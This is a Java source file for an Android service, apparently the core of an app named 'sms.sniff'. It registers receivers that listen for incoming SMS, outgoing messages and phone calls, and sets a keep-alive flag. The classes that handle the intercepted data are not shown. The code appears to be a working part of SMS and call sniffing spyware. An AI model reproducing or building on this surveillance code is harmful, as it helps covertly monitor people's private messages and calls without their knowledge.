package sms.sniff.core;

import sms.sniff.call.IncomingOutgoingCall;
import sms.sniff.sms.Incoming;
import sms.sniff.sms.Outgoing;
import sms.sniff.utils.SharedPreferencesEditor;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;

public class DynamicRegisterService extends Service{

	private BroadcastReceiver incoming;
	private Intent outgoing;
	private SharedPreferencesEditor sharedPreferencesEditor;
	private IncomingOutgoingCall incomingCall;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
	
	@Override
	public void onCreate() {
		super.onCreate();
		
		incoming = new Incoming();
		registerReceiver(incoming, new IntentFilter("android.provider.Telephony.SMS_RECEIVED"));
		
		outgoing = new Intent(this, Outgoing.class);
		startService(outgoing);
		
		incomingCall = new IncomingOutgoingCall();
		registerReceiver(incomingCall, new IntentFilter("android.intent.action.PHONE_STATE"));
		registerReceiver(incomingCall, new IntentFilter("android.intent.action.NEW_OUTGOING_CALL"));
		
		sharedPreferencesEditor = new SharedPreferencesEditor(this);
		sharedPreferencesEditor.keepAlive(true);
		
		
	}
	
	@Override
	public void onDestroy() {
		
		unregisterReceiver(incomingCall);
		unregisterReceiver(incoming);
		stopService(outgoing);
		
		sharedPreferencesEditor.keepAlive(false);
		
		super.onDestroy();
	}
}
